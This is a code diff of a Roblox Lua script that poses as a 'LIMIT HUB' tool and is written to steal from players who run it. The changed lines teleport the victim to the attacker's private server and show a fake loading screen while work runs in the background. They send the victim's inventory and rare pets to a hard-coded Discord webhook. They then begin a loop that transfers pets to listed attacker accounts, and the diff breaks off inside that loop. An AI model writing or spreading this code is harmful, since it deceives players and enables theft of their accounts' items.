@@ -4,40 +4,36 @@ local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
--- Webhook (optional logging)
+-- Configs
 local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
-
--- Target Pets
 local targetedPets = {
     "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
     "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
     "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
 }
-
--- Attacker Usernames (your accounts)
 local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
-
--- Private Server Info (your server)
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 
--- STEP 1: Teleport to your private server
-task.delay(2, function()
+-- Step 1: Teleport victim if not in private server
+if game.JobId == "" then
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
-end)
+    return
+end
 
--- STEP 2: Wait for load
+-- Step 2: Wait for the game to fully load
 game.Loaded:Wait()
-task.wait(5)
+task.wait(3)
 
--- STEP 3: Fake LIMIT HUB GUI (5% per 10s)
+-- Step 3: Fake GUI while functions run in background
 task.spawn(function()
-    local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
+    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
 
-    local bg = Instance.new("Frame", screenGui)
+    local bg = Instance.new("Frame", gui)
     bg.BackgroundColor3 = Color3.new(0, 0, 0)
     bg.Size = UDim2.new(1, 0, 1, 0)
 
@@ -61,39 +57,39 @@ task.spawn(function()
     fill.Size = UDim2.new(0, 0, 1, 0)
     fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
 
-    local percentLabel = Instance.new("TextLabel", bg)
-    percentLabel.Size = UDim2.new(0, 100, 0, 40)
-    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
-    percentLabel.BackgroundTransparency = 1
-    percentLabel.Text = "0%"
-    percentLabel.TextColor3 = Color3.new(1, 1, 1)
-    percentLabel.Font = Enum.Font.SciFi
-    percentLabel.TextScaled = true
+    local percentText = Instance.new("TextLabel", bg)
+    percentText.Size = UDim2.new(0, 100, 0, 40)
+    percentText.Position = UDim2.new(0.5, -50, 0.5, -70)
+    percentText.Text = "0%"
+    percentText.BackgroundTransparency = 1
+    percentText.TextColor3 = Color3.new(1, 1, 1)
+    percentText.Font = Enum.Font.SciFi
+    percentText.TextScaled = true
 
-    local loadingText = Instance.new("TextLabel", bg)
-    loadingText.Text = "LOADING"
-    loadingText.Size = UDim2.new(0, 400, 0, 70)
-    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
-    loadingText.BackgroundTransparency = 1
-    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
-    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
-    loadingText.TextStrokeTransparency = 0.2
-    loadingText.Font = Enum.Font.SciFi
-    loadingText.TextScaled = true
+    local loadText = Instance.new("TextLabel", bg)
+    loadText.Text = "LOADING"
+    loadText.Size = UDim2.new(0, 400, 0, 70)
+    loadText.Position = UDim2.new(0.5, -200, 0.5, 40)
+    loadText.BackgroundTransparency = 1
+    loadText.TextColor3 = Color3.fromRGB(0, 255, 255)
+    loadText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
+    loadText.TextStrokeTransparency = 0.2
+    loadText.Font = Enum.Font.SciFi
+    loadText.TextScaled = true
 
     local percent = 0
     while percent <= 100 do
-        percentLabel.Text = percent .. "%"
+        percentText.Text = percent .. "%"
         fill.Size = UDim2.new(percent / 100, 0, 1, 0)
         percent += 5
         task.wait(10)
     end
 
-    screenGui:Destroy()
+    gui:Destroy()
 end)
 
--- STEP 4: Send inventory to webhook
-task.delay(10, function()
+-- Step 4: Send Inventory to Discord
+task.delay(5, function()
     local data = {items = {}, rarePets = {}}
     local folders = {
         LocalPlayer:FindFirstChild("Pets"),
@@ -112,29 +108,27 @@ task.delay(10, function()
         end
     end
 
-    local payload = {
-        username = "LimitHub Logger",
-        embeds = {{
-            title = "🚨 New Target Logged",
-            description = "**User:** " .. LocalPlayer.Name ..
-                "\n**Items:** " .. table.concat(data.items, ", ") ..
-                "\n**Rare Pets:** " .. table.concat(data.rarePets, ", "),
-            color = 16776960
-        }}
-    }
-
     pcall(function()
         request({
             Url = webhookUrl,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
+            Body = HttpService:JSONEncode({
+                username = "LimitHub Logger",
+                embeds = {{
+                    title = "🚨 Target Inventory Logged",
+                    description = "**Username:** " .. LocalPlayer.Name ..
+                        "\n**Items:** " .. table.concat(data.items, ", ") ..
+                        "\n**Target Pets:** " .. table.concat(data.rarePets, ", "),
+                    color = 16711680
+                }}
+            })
         })
     end)
 end)
 
--- STEP 5: Auto-transfer pets silently
-task.delay(12, function()
+-- Step 5: Auto-Transfer Pets
+task.delay(10, function()
     task.spawn(function()
         while true do
             for _, p in pairs(Players:GetPlayers()) do
